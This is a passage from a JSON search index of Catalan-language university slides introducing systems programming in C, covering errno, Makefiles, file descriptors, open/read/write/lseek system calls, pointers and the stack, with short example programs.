    "text": "External declarations\nUna declaraci√≥ externa porta aquest nom a l‚Äôespai de noms de la unitat de compilaci√≥ actual (tamb√© conegut com fitxer) i permet al programa accedir a aquesta variable. La paraula clau extern amplia la visibilitat de la funci√≥ a tot el programa, la funci√≥ es pot utilitzar (anomenar) a qualsevol lloc de qualsevol dels fitxers de tot el programa, sempre que aquests fitxers continguin una declaraci√≥ de la funci√≥.\nextern int errno;\n// errno s'utilitza com a canal de comunicaci√≥ per la  biblioteca \n// C est√†ndard per comunicar el motiu de fallada d'una funci√≥ determinada.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llibreria-errno",
    "href": "slides/01-c.html#llibreria-errno",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Llibreria errno",
    "text": "Llibreria errno\nLa variable global errno √©s defineix a la biblioteca errno.h.\n\nAquest valor de variable nom√©s √©s rellevant quan la trucada retorna un error (normalment el codi -1).\nPer m√©s informaci√≥: $ man errno\nEs pot veure un missatge d‚Äôerror descriptiu identificat per errno utilitzant la funci√≥ perror de la biblioteca &lt;stdio.h&gt;. Funci√≥: void perror(const char*); Aquesta funci√≥ primer mostra el missatge i despr√©s l‚Äôerror. #include &lt;stdio.h&gt;.\n\n\nFitxer: sources/errno_example.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-echo-amb-c",
    "href": "slides/01-c.html#activitat-echo-amb-c",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Activitat: echo amb c",
    "text": "Activitat: echo amb c\n\n#include &lt;stdio.h&gt;\n\nint main(int argc, char *argv[]) {\n  int i;\n  if (argc &lt; 2) {\n    fprintf(stderr, \"Usage: %s &lt;string&gt;\\n\", argv[0]);\n    return -1;\n  }\n  for (i = 1; i &lt; argc; i++) {\n    printf(\"%s \", argv[i]);\n  }\n  printf(\"\\n\");\n  return 0;\n}\n\nFitxer: sources/echo.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-cd-amb-c",
    "href": "slides/01-c.html#activitat-cd-amb-c",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Activitat: cd amb c",
    "text": "Activitat: cd amb c\n#include &lt;stdio.h&gt;  // Per fprintf() i perror()\n#include &lt;unistd.h&gt; // Per chdir()\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) {\n        fprintf(stderr, \"Usage: %s &lt;directory&gt;\\n\", argv[0]);\n        return 1;\n    }\n    if (chdir(argv[1]) == -1) {\n        perror(\"chdir\");\n        return 1;  \n    }\n    return 0;  \n}\n\nFitxer: sources/cd.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√®-√©s-un-makefile",
    "href": "slides/01-c.html#qu√®-√©s-un-makefile",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√® √©s un Makefile?",
    "text": "Qu√® √©s un Makefile?\nUn fitxer Makefile √©s un fitxer de text que cont√© un conjunt de regles utilitzades per construir un programa. Aquestes regles indiquen al sistema com compilar i enlla√ßar el programa.\n\nAutomatitzaci√≥: Simplifica el proc√©s de compilaci√≥ i enlla√ßat.\nEfici√®ncia: Nom√©s es compilen els fitxers modificats, no tot el projecte.\nOrganitzaci√≥: Organitza el codi i les depend√®ncies de manera estructurada.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#organitzaci√≥-del-makefile",
    "href": "slides/01-c.html#organitzaci√≥-del-makefile",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Organitzaci√≥ del Makefile",
    "text": "Organitzaci√≥ del Makefile\ntarget: dependencies\n    command\n\ntarget: Nom de l‚Äôobjectiu (executable o fitxer objecte).\ndependencies: Fitxers necessaris per a generar l‚Äôobjectiu.\ncommand: Comandaments per a compilar o generar l‚Äôobjectiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#plantilla-per-compilar-un-programa",
    "href": "slides/01-c.html#plantilla-per-compilar-un-programa",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Plantilla per compilar un programa",
    "text": "Plantilla per compilar un programa\nCC = gcc\nCFLAGS = -Wall -O2\nTARGET = programa\n\nall: $(TARGET)\n\n$(TARGET): programa.c\n    $(CC) $(CFLAGS) -o $(TARGET) programa.c\n\nclean:\n    rm -f $(TARGET)\n\nLa opci√≥ -O2 √©s un nivell d‚Äôoptimitzaci√≥ per al compilador. Indica al compilador que optimitzi el codi generat per a un millor rendiment. Inclou un conjunt d‚Äôoptimitzacions per millorar la velocitat i la grand√†ria del codi. Tenim diferents nivells d‚Äôoptimitzaci√≥, per exemple -O0, -O1, -O2, -O3, -Os, -Og, -Ofast.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-gestiona-lentrada-i-sortida-el-so",
    "href": "slides/01-c.html#com-gestiona-lentrada-i-sortida-el-so",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Com gestiona l‚Äôentrada i sortida el SO?",
    "text": "Com gestiona l‚Äôentrada i sortida el SO?\nUns dels objectius del SO √©s proporcionar una m√†quina virtual que uniformitzi la complexitat dels dispositius d‚ÄôE/S, necessitem independitzar les operacions i els dispositius.\n\nDispositius reals: Existeix en el m√≥n real. Combinaci√≥ de diferents elements harwdare i software.\nDispositius f√≠sics: Formats pel perif√®ric i pel seu hardware de control i el programari que el gestiona (drivers).\nDispositius l√≤gics: El resultat d‚Äôun programari del sistema que crea aquest dispositiu.\n\nNull: Dispositiu d‚ÄôE/S sobre el qual podem escriure tot el que vulguem i sempre √©s buit.\nFinestra: Dispositiu l√≤gic d‚ÄôE/S que combina 4 dispositius f√≠sics: pantalla, teclat, mem√≤ria i un apuntador (ratol√≠).\n\n\n\nL‚Äôespai l√≤gic √©s una agrupaci√≥ d‚Äôinformaci√≥ emmagatzemada a la mem√≤ria f√≠sica utilitzant la mem√≤ria virtual. Per tant, l‚Äôespai l√≤gic d¬¥‚Äôun proc√©s es pot veure com un dispositiu entrada/sortida. Us podeu imaginar aquest espai l√≤gic com un fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#esquema-de-dispositius",
    "href": "slides/01-c.html#esquema-de-dispositius",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Esquema de dispositius",
    "text": "Esquema de dispositius",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#dispositius-virtuals",
    "href": "slides/01-c.html#dispositius-virtuals",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Dispositius virtuals",
    "text": "Dispositius virtuals\nUn dispositiu virtual √©s un dispositiu que a priori no est√† associat a cap dispositiu real. En temps d‚Äôexecuci√≥ el sistema operatiu associar√† el dispositiu virtual amb el dispositiu real.\n\nAssociaci√≥ impl√≠cita: El sistema i el proc√©s que ha iniciat l‚Äôexecuci√≥ s√≥n els encarregats de fer l‚Äôassociaci√≥. Els dispositius virtuals associats de manera impl√≠cita s√≥n els dispositius est√†ndard, en el cas d‚ÄôUnix tenim entrada est√†ndard (stdin), sortida est√†ndard(stdout) i sortida est√†ndard d‚Äôerrors (stderr).\nAssociaci√≥ expl√≠cita: Aquesta associaci√≥ es dona entre un dispositiu virtual i un dispositiu real pel mateix programa durant l‚Äôexecuci√≥. Per efectuar-la el programa necessita realitzar una operaci√≥ espec√≠fica que donat un dispositiu real generi un dispositiu virtual associat. A partir d‚Äôaquest moment el programa realitzar√† les operacions d‚ÄôE/S del dispositiu mitjan√ßant el dispositiu virtual.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-es",
    "href": "slides/01-c.html#operacions-es",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Operacions E/S",
    "text": "Operacions E/S\nEl processos utilitzen els descriptors de fitxers per accedir als dispositius un cop ja han estat oberts per llegir i escriure informaci√≥.\n\n\nOperacions\n\nllegir(dispositiu,buffer de lectura,posici√≥)\nescriure(dispositiu,buffer escriptura,posici√≥)\nobrir(dispositiu, operaci√≥)\ntancar(dispositiu)\nposicionar(dispositiu, posici√≥)\n\n\nDescriptors\n\n0: Entrada est√†ndard (stdin)\n1: Sortida est√†ndard(stdout)\n2: Sortida est√†ndard d‚Äôerrors (stderr)\n\n\n\nFixeu-vos que el fet d‚Äôutilitzar dispositius virtuals no soluciona el problema de la independ√®ncia si el sistema operatiu √∫nicament utilitza els dispositius virtuals i aquests han de con√®ixer les peculiaritats dels dispositius reals per poder operar-hi. Per tant, necessitem una nova capa per damunt dels drivers que uniformitzi les operacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxer",
    "href": "slides/01-c.html#descriptors-de-fitxer",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Descriptors de fitxer",
    "text": "Descriptors de fitxer",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#fitxers",
    "href": "slides/01-c.html#fitxers",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Fitxers",
    "text": "Fitxers\n\n\n\nUn fitxer √©s una seq√º√®ncia contigua de bytes.\nEl sistema operatiu no imposa cap format espec√≠fic.\nCada byte es pot adre√ßar individualment.\nUn descriptor de fitxer √©s un nombre enter positiu espec√≠fic que identifica els seus fixers oberts.\nTots els fitxers oberts per una aplicaci√≥ es tanquen autom√†ticament quan el proc√©s acaba.\n\n\n\n\n\nValor\nSignificat\nDefecte\n\n\n\n\n0\nstdin (teclat)\nSI\n\n\n1\nstdout (pantalla)\nSI\n\n\n2\nstderr (pantalla)\nSI\n\n\n\\(3...N\\)\ndisponibles pels usuaris\nNO\n\n\n\n\nopen() : obre fitxers per llegir i/o escriure o per crear-los.\ncreat() : crea un fitxer buit.\nread() : llegeix informaci√≥ d‚Äôun fitxer.\nwrite() : escriu informaci√≥ en un fitxer.\nlseek() : aneu a un byte espec√≠fic del fitxer.\nunlink() : elimina un fitxer.\nfcntl() : controla els atributs d‚Äôun fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#obrint-fitxers",
    "href": "slides/01-c.html#obrint-fitxers",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Obrint fitxers",
    "text": "Obrint fitxers\nPer crear o obrir un fitxer fem anar les crides a sistema open() i creat(). Aquestes retornen la seva descripci√≥, o retornen -1 si hi ha hagut algun error.\n\n\n#include &lt; sys/types.h&gt; \n#include &lt; sys/stat.h&gt; \n#include &lt; fcntl.h&gt; \n\nint open ( const char *path, \n  int flags [, mode_t mode ]);\nint creat (const char *path, \n  mode_t mode);\n\n\npath: cadena amb el cam√≠ relatiu o absolut al fitxer.\nflags: m√®tode d‚Äôobertura de fitxer:\n\nO_RDONLY - nom√©s lectura.\nO_WRONLY - nom√©s escriptura.\nO_RDWR - lectura i escriptura.\nO_CREAT - crea el fitxer si no existeix.\nO_TRUNC - si existeix, l‚Äôobre i es trunca a 0 bytes.\nO_APPEND - escriu al final del fitxer.\n\nmode: especifica els permisos si es crea un fitxer nou (0644: -rw-r‚Äìr‚Äì)\n\n\n\nPodeu consultar la p√†gina de manual de les crides a sistema per obtenir m√©s informaci√≥:\n\nman -s2 fcntl\nman -s2 stat\nman -s2 open\nman creat",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#tancant-fitxers",
    "href": "slides/01-c.html#tancant-fitxers",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Tancant fitxers",
    "text": "Tancant fitxers\nPer tancar un fitxer utilitzarem close(). Aquesta crida a sistema desassocia el fitxer del proc√©s. Retorna 0 si tot funciona correctament, en ca d‚Äôerror -1.\n#include &lt;unistd.h&gt; \nint close(int fd);\n\nfd: Descriptor de fitxer que volem tancar.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-i",
    "href": "slides/01-c.html#descriptors-de-fitxers-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Descriptors de fitxers (I)",
    "text": "Descriptors de fitxers (I)\nint main() {\n \n int fd1, fd2, fd3;\n FILE *f;\n printf(\"STDIN_FILENO: %d\\n\", STDIN_FILENO); \n printf(\"stdout: %d\\n\", fileno(stdout)); \n printf(\"STDERR_FILENO: %d\\n\", STDERR_FILENO);\n\n printf(\"\\nOpening /dev/zero...\\n\");\n if ((fd1 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n } else {\n  printf(\"fd1: %d\\n\", fd1);\n }\n\nFitxer: sources/descriptors.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-ii",
    "href": "slides/01-c.html#descriptors-de-fitxers-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Descriptors de fitxers (II)",
    "text": "Descriptors de fitxers (II)\n printf(\"\\nOpening /dev/zero a second time...\\n\");\n if ((fd2 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"fd2: %d\\n\", fd2);\n\n printf(\"\\nNow closing fd1, but keeping fd2 open..\\n\");\n (void)close(fd1);\n\n printf(\"\\nOpening /dev/zero a third time...\\n\");\n if ((fd3 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"fd3: %d\\n\", fd3);",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-iii",
    "href": "slides/01-c.html#descriptors-de-fitxers-iii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Descriptors de fitxers (III)",
    "text": "Descriptors de fitxers (III)\n printf(\"\\nNow closing fd2 and fd3.\\n\");\n (void)close(fd2);\n (void)close(fd3);\n\n printf(\"Now opening /dev/zero as a stream.\\n\");\n if ((f = fopen(\"/dev/zero\", \"r\")) == NULL) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"f: %d\\n\", fileno(f));\n (void)fclose(f);\n\n return EXIT_SUCCESS;\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxers-i",
    "href": "slides/01-c.html#llegint-fitxers-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Llegint fitxers (I)",
    "text": "Llegint fitxers (I)\n\n\n#include &lt;unistd.h&gt; \nssize_t read\n(int fd, \n void *buf, size_t);\n\nssize_t write\n(int fd, \n void *buf, size_t);\n\nread(): Intenta llegir/escriure fins a nbytes bytes del fitxer especificat per fd i emmagatzemar-los a l‚Äô√†rea de mem√≤ria que comen√ßa a buf. Par√†metres:\n\nfd: descriptor del fitxer que es llegir√†/escriur√†.\nnbytes: nombre de bytes a llegir/escriure.\nbuf : apunta a la mem√≤ria interm√®dia on es desar√† la informaci√≥ de lectura/escriptura. Retorna:\n\nSi t√© √®xit, retorna el nombre de bytes de lectura/escriptura (0 significa final del fitxer).\nSi hi ha error, retorna -1 i especifica el motiu en errno.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxer-ii",
    "href": "slides/01-c.html#llegint-fitxer-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Llegint fitxer (II)",
    "text": "Llegint fitxer (II)\nint main(int argc, char* argv[]) {\n  char string[11]; int b_read;\n  int file = open (\"my_file\", O_RDONLY); \n  if(file == -1) { \n    perror(\"Error while opening file\");\n    exit(1);\n  }\n  b_read = read(file, string, 10);\n  close(file);\n  string[10] = 0;\n  printf(\"%d B have been read. The obtained string is: %s\\n\", \n    b_read, string);\n  return 0;\n}\n\nFitxer: sources/llegir_fitxer.c\n\n\nPer generar un fitxer amb dades aleat√≤ries: head -c 1024 &lt;/dev/urandom &gt; my_file.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#escrivint-fitxers",
    "href": "slides/01-c.html#escrivint-fitxers",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Escrivint fitxers",
    "text": "Escrivint fitxers\nint main(int argc, char* argv[]) {\n\n  const char* string = \"\\nWinter is coming\\n\\n\";\n\n  int file = open(\"new_file\", O_CREAT|O_WRONLY, 0644);\n\n  if(file == -1) { \n    perror(\"Error when opening file\");\n    exit(1);\n  }\n\n  write(file, string, strlen(string));\n  close(file);\n\n  exit(0);\n}\n\nFitxer: sources/escriure_fitxer.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegintescrivint-en-llocs-espec√≠fics",
    "href": "slides/01-c.html#llegintescrivint-en-llocs-espec√≠fics",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Llegint/Escrivint en llocs espec√≠fics",
    "text": "Llegint/Escrivint en llocs espec√≠fics\n\n\n#include &lt; sys/types.h&gt; \n#include &lt; unistd.h&gt; \noff_t lseek( int fd,\n off_t offset, \n int whence)\n\n\nfd: descriptor de fitxer.\noffset: despla√ßament relatiu del punter en bytes.\nwhence: directiva de despla√ßament:\n\nSEEK_SET: el punter es col¬∑loca offset bytes.\nSEEK_CUR: el punter es mou offset bytes des de la seva posici√≥ actual.\nSEEK_END: el punter es mou offset bytes des del final del fitxer.\n\nSi t√© √®xit, retorna la posici√≥ absoluta del punter (en bytes).\nSi hi ha error, retorna -1 i especifica el motiu en errno.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxers-en-llocs-espec√≠fics",
    "href": "slides/01-c.html#llegint-fitxers-en-llocs-espec√≠fics",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Llegint fitxers en llocs espec√≠fics",
    "text": "Llegint fitxers en llocs espec√≠fics\nint main(int argc, char* argv[]) {\n  char string[11];\n  int b_read;\n\n  int file = open (\"my_file\", O_RDONLY); \n\n  lseek(file, 46, SEEK_SET);\n  b_read = read(file, string, 10); // Read 10 bytes\n  close(file);\n\n  string[10] = 0;\n  printf(\"%d B have been read. The obtained string is: %s\\n\", \n  b_read, string);\n\n  return 0;\n}\n\nFitxer: sources/llegir_fitxer2.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#escrivint-en-llocs-espec√≠fics",
    "href": "slides/01-c.html#escrivint-en-llocs-espec√≠fics",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Escrivint en llocs espec√≠fics",
    "text": "Escrivint en llocs espec√≠fics\nchar buf1[] = \"abcdefghij\";\nchar buf2[] = \"ABCDEFGHIJ\";\n\nint main() {\n  int fd;\n  if((fd = creat(\"new_file2\", 0644)) &lt; 0) {\n    perror(\"new_file2\"); exit(-1);\n  }\n\n  if(write(fd, buf1, 10) != 10)       perror(\"buf1\");    // offset == 10\n  if(lseek(fd, 4, SEEK_SET) == -1)    perror(\"lseek\");   // offset == 4\n  if(write(fd, buf2, 10) != 10)       perror(\"buf2\");    // offset == 14\n\n  return 0;\n}\n\nFitxer: sources/escriure_fitxer2.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√®-s√≥n-els-punters",
    "href": "slides/01-c.html#qu√®-s√≥n-els-punters",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√® s√≥n els punters?",
    "text": "Qu√® s√≥n els punters?\n\n\nConcepte\n\nTotes les dades (variables, constants,‚Ä¶) s‚Äôemmagatzemen des d‚Äôuna determinada adre√ßa de mem√≤ria i utilitzant tants bytes com sigui necessari.\nUn punter √©s una variable guardada en una adre√ßa de m√®moria que cont√© un altra adre√ßa de mem√≤ria.\n\n\nOperadors\n\n&: Retorna l‚Äôadre√ßa de l‚Äôapuntador. Per exemple &x ens d√≥na l‚Äôadre√ßa de la variable x.\n* Retorn el valor de la variable situada a l‚Äôadre√ßa especificada pel seu operand (dereferencing).\n\n\n\nEl valor que retorna l‚Äôoperador & dep√®n de la posici√≥ del seu operand i, per tant, no est√† sota el control del programador.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funcionen-els-punters-i",
    "href": "slides/01-c.html#com-funcionen-els-punters-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Com funcionen els punters? (I)",
    "text": "Com funcionen els punters? (I)\nint main (int argc, char * argv[]){\nint s=10,n,m;\nint *ptr=&s;\n};",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funcionen-els-punters-ii",
    "href": "slides/01-c.html#com-funcionen-els-punters-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Com funcionen els punters? (II)",
    "text": "Com funcionen els punters? (II)\n\n\nint \nmain (int argc, \n    char * argv[]){\n    int s=10;\n    float f=10.5;\n    char a='a';\n\n    int *pt1 = &s;\n    float *pt2 = &f;\n    char *pt3= &a;\n};\n\n\n\n\nFitxer: sources/punters_diapos.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-amb-punters-i",
    "href": "slides/01-c.html#operacions-amb-punters-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Operacions amb punters (I)",
    "text": "Operacions amb punters (I)\n\nAssignaci√≥ (=): Assigna una adre√ßa a un punter.\nComparaci√≥ (==, !=): Igualtat o desigualtat.\nInicialitzaci√≥ (NULL): Indica que el punter no cont√© cap adre√ßa.\nIncrement (++), decrement (‚Äì): Canviar un punter a l‚Äôelement seg√ºent/anterior d‚Äôuna s√®rie (per exemple, una matriu).\nIndexat ([]): acc√©s a l‚Äôelement n d‚Äôuna s√®rie.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-amb-punters-ii",
    "href": "slides/01-c.html#operacions-amb-punters-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Operacions amb punters (II)",
    "text": "Operacions amb punters (II)\nint n = 2;\nint *ptr1 = NULL;\nptr1 = &n;\n(*ptr1)++        //Modifiquem el valor de la variable a la que apunta\nptr1++           //Modifiquem l'adre√ßa de mem√≤ria on apunta",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#pas-de-par√†metres-valor",
    "href": "slides/01-c.html#pas-de-par√†metres-valor",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Pas de par√†metres (valor)",
    "text": "Pas de par√†metres (valor)\n#include &lt;stdio.h&gt;\n\nint sumar_per_valor(int a, int b) {\n    a = a + b;\n    return a;\n}\n\nint main() {\n    int x = 5;int y = 3;\n    printf(\"Abans de la crida per valor: x = %d, y = %d\\n\", x, y);\n    int resultat = sumar_per_valor(x, y);\n    printf(\"Despr√©s de la crida per valor: x = %d, y = %d\\n\", x, y);\n    printf(\"Resultat de la suma: %d\\n\", resultat);\n\n    return 0;\n}\n\nFitxer: sources/pas_valor.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#pas-de-par√†metres-refer√®ncia",
    "href": "slides/01-c.html#pas-de-par√†metres-refer√®ncia",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Pas de par√†metres (refer√®ncia)",
    "text": "Pas de par√†metres (refer√®ncia)\n#include &lt;stdio.h&gt;\n\nvoid sumar_per_referencia(int *a, int *b) {\n    *a = *a + *b;\n}\n\nint main() {\n    int x = 5; int y = 3;\n    printf(\"Abans de la crida per refer√®ncia: x = %d, y = %d\\n\", x, y);\n    sumar_per_referencia(&x, &y);\n    printf(\"Despr√©s de la crida per refer√®ncia: x = %d, y = %d\\n\", x, y);\n    return 0;\n}\n\nFitxer: sources/pas_referencia.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenaci√≥-dun-array",
    "href": "slides/01-c.html#exemple-ordenaci√≥-dun-array",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: Ordenaci√≥ d‚Äôun array",
    "text": "Exemple: Ordenaci√≥ d‚Äôun array\nvoid ordenar(int n, int* ptr)\n{\n    int i, j, t;\n    for (i = 0; i &lt; n; i++) {\n        for (j = i + 1; j &lt; n; j++) {\n            if (*(ptr + j) &lt; *(ptr + i)) {\n                t = *(ptr + i);\n                *(ptr + i) = *(ptr + j);\n                *(ptr + j) = t;\n            }\n        }\n    }\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√®-√©s-la-stack",
    "href": "slides/01-c.html#qu√®-√©s-la-stack",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Qu√® √©s la Stack?",
    "text": "Qu√® √©s la Stack?\n√âs una estructura LIFO (Last-In,First-Out). La pila √©s una regi√≥ especial de mem√≤ria i la gestiona autom√†ticament la CPU, de manera que no cal assignar ni desassignar mem√≤ria. La mem√≤ria de pila es divideix en trames successives on cada vegada que es crida una funci√≥, s‚Äôassigna una nova trama de pila.\nCaracter√≠stiques de la Stack\n\nOrdre seq√ºencial: Les variables s‚Äôempilen i desempilen en ordre seq√ºencial.\nGesti√≥ autom√†tica: No cal que el programador assigni o alliberi mem√≤ria manualment.\nLimitaci√≥ de mida: La pila √©s limitada, i si es supera el seu l√≠mit, es produeix un desbordament de pila.\nVariables locals: Les variables de la pila nom√©s existeixen mentre la funci√≥ est√† en execuci√≥.\nEficient: L‚Äôacc√©s a la mem√≤ria de la pila √©s molt r√†pid, ja que segueix un ordre seq√ºencial i clar.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qu√®-√©s-la-heap",
    "href": "slides/01-c.html#qu√®-√©s-la-heap",
